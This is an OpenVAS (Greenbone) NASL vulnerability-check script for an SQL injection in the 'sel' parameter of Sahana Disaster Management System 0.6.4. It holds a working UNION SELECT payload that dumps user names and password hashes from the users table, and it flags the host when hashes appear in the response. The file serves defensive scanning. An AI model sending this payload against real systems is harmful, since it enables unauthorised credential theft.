###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sahana_45638.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Sahana Disaster Management System 'sel' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Sahana Disaster Management System is prone to an SQL-injection
vulnerability because it fails to sufficiently sanitize user-supplied
data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

Sahana Disaster Management System 0.6.4 is vulnerable; other versions
may also be vulnerable.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103014");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-01-05 15:07:33 +0100 (Wed, 05 Jan 2011)");
 script_bugtraq_id(45638);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Sahana Disaster Management System 'sel' Parameter SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45638");
 script_xref(name : "URL" , value : "http://www.sahanafoundation.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("sahana_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"sahana"))exit(0);
url = string(dir,"/www/xml.php?act=add_loc&sel=1/**/UNION/**/SELECT/**/null,concat(CHAR(60,66,82,62),concat_ws(char(58),user_name,password)),null/**/FROM/**/users"); 

if(http_vuln_check(port:port, url:url,pattern:"[a-zA-Z0-9_-]+:[a-f0-9]{32}")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
